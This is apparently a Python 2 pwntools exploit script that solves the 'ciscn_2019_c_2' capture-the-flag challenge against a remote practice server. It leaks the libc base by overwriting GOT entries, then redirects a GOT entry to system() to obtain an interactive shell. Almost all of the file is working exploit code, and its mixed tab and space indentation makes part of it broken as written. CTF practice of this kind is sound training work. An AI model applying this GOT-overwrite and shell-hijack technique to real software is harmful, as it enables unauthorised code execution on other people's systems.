from pwn import *

binary = ELF("./ciscn_2019_c_2")

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

#libc = ELF("./libc.so.6")
context.arch = 'amd64'


def calc(formula,p = False,q = False):
    if(p == True):
        io.sendlineafter("formula:\n","0")
    	if(q == True):
        	io.sendafter("calc:\n",formula)
    	else:
            io.sendlineafter("calc:\n",formula)
    else:
        io.sendlineafter("formula:\n",str(len(formula)))
        io.sendafter("calc:\n",formula)
    buf = io.recvline().strip()
    print buf
    return buf


while True:

    while True:

        #io = process("./ciscn_2019_c_2")
        io = remote('node3.buuoj.cn',28693)
        payload = str(binary.plt["puts"]).ljust(0x30,'\x00')

        payload += p64(binary.got["free"])*2
        payload += p64(binary.got["puts"])
        payload += 0x10*'\x00'
        payload += p32(len(str(binary.plt["puts"])))
        calc(payload,p = True)
        io.recvuntil("input \n")
        libc_base = u64(io.recv(6).ljust(8,'\x00'))-libc.sym['puts']
        info("LIBC BASE -> %#x"%libc_base)
        if(((libc_base&0xff000000)>>24)>4):
            io.close()
            break
        raw_input("1/64")
        #gdb.attach(io,'b *0x400c9c')


        one = libc_base+libc.sym['system']
        one_low = one&0xffffffff
        info("%#x"%one_low)
        payload = str(one_low).ljust(0x30,'\x00')
        payload += p64(binary.got["memset"])*2
        payload += p64(binary.got["puts"])*2
        payload += 0x10*'\x00'
        payload += p32(len(str(one_low)))
        calc(payload,p = True,q= True)
        io.interactive()

